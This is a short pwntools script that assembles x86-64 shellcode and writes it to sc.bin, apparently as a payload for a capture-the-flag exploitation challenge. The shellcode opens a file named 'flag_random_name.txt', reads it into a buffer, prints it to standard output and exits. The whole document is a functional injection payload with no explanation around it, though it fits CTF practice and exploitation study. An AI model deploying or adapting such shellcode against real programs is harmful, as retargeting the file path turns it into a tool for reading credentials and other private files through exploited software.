from pwn import *
context.arch = 'amd64'

shellcode = asm('''
    xor eax, eax
    add al, 2
    lea rdi, [rip+filename]
    xor esi, esi
    xor edx, edx
    syscall
    
    mov edi, eax
    xor eax, eax
    lea rsi, [rip+buffer]
    mov dl, 100
    syscall
    
    mov edx, eax
    xor eax, eax
    inc eax
    mov edi, 1
    lea rsi, [rip+buffer]
    syscall
    
    xor eax, eax
    mov al, 60
    xor edi, edi
    syscall
    
filename:
    .ascii "flag_random_name.txt"
    .byte 0
buffer:
    .space 100
''')

with open('sc.bin', 'wb') as f:
    f.write(shellcode)
    
print(f"Shellcode written to sc.bin ({len(shellcode)} bytes)")
